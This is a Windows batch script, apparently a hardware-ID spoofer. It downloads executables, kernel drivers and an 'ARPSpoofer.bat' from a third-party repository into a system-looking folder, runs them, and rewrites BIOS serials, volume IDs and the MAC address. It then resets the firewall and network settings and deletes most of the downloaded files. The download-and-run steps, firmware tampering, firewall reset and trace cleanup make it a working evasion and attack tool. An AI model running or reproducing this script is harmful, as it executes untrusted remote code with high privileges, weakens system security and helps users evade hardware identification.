@echo off
setlocal

:: Set directory path
set directoryPath=C:\Windows\Globalization\Time Zone

:: Create the directory if it doesn't exist
if not exist "%directoryPath%" mkdir "%directoryPath%"

:: Download the required files
echo Downloading files...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githack.com/spantawww/nothing/refs/heads/main/ARPSpoofer.bat', '%directoryPath%\ARPSpoofer.bat')"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githack.com/spantawww/nothing/refs/heads/main/amifldrv64.sys', '%directoryPath%\amifldrv64.sys')"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githack.com/spantawww/nothing/refs/heads/main/AMIDEWINx64.EXE', '%directoryPath%\AMIDEWINx64.EXE')"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githack.com/spantawww/nothing/refs/heads/main/amigendrv64.sys', '%directoryPath%\amigendrv64.sys')"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githack.com/spantawww/nothing/refs/heads/main/MAC.bat', '%directoryPath%\MAC.bat')"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githack.com/spantawww/nothing/refs/heads/main/Volumeid64.exe', '%directoryPath%\Volumeid64.exe')"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githack.com/spantawww/nothing/refs/heads/main/Volumeid.exe', '%directoryPath%\Volumeid.exe')"

:: Change to the target directory
cd /d "%directoryPath%"

:: Run Volumeid64.exe and Volumeid.exe
start /wait Volumeid64.exe
start /wait Volumeid.exe

:: Run AMIDEWINx64.EXE with various parameters (Serial and system information)
start /wait AMIDEWINx64.EXE /SU AUTO
start /wait AMIDEWINx64.EXE /BS RandomSerial
start /wait AMIDEWINx64.EXE /CS RandomSerial
start /wait AMIDEWINx64.EXE /SS RandomSerial
start /wait AMIDEWINx64.EXE /SM "System manufacturer"
start /wait AMIDEWINx64.EXE /SP "System Product Name"
start /wait AMIDEWINx64.EXE /SV "System Version"
start /wait AMIDEWINx64.EXE /SK "SKU"
start /wait AMIDEWINx64.EXE /BT "Default string"
start /wait AMIDEWINx64.EXE /BLC "Default string"
start /wait AMIDEWINx64.EXE /CM "Default string"
start /wait AMIDEWINx64.EXE /CV "Default string"
start /wait AMIDEWINx64.EXE /CA "Default string"
start /wait AMIDEWINx64.EXE /CSK "Default string"
start /wait AMIDEWINx64.EXE /SF "To be filled by O.E.M."
start /wait AMIDEWINx64.EXE /PSN RandomSerial

:: Run MAC.bat script
start /wait MAC.bat

:: Reset network settings (equivalent to your 'RunCommand' for network reset)
netsh winsock reset
netsh int ip reset
netsh advfirewall reset
ipconfig /release
ipconfig /flushdns
ipconfig /renew
ipconfig /flushdns

:: Disable/Enable Network Adapter
WMIC PATH WIN32_NETWORKADAPTER WHERE PHYSICALADAPTER=TRUE CALL DISABLE
WMIC PATH WIN32_NETWORKADAPTER WHERE PHYSICALADAPTER=TRUE CALL ENABLE

:: Clear ARP cache
arp -d

:: Restart the Windows Management Instrumentation (WMI) service
net stop winmgmt /y
net start winmgmt

:: Clean up downloaded files
del /f /q "%directoryPath%\AMIDEWINx64.EXE"
del /f /q "%directoryPath%\amifldrv64.sys"
del /f /q "%directoryPath%\amigendrv64.sys"
del /f /q "%directoryPath%\Volumeid.exe"
del /f /q "%directoryPath%\Volumeid64.exe"
del /f /q "%directoryPath%\MAC.bat"

endlocal
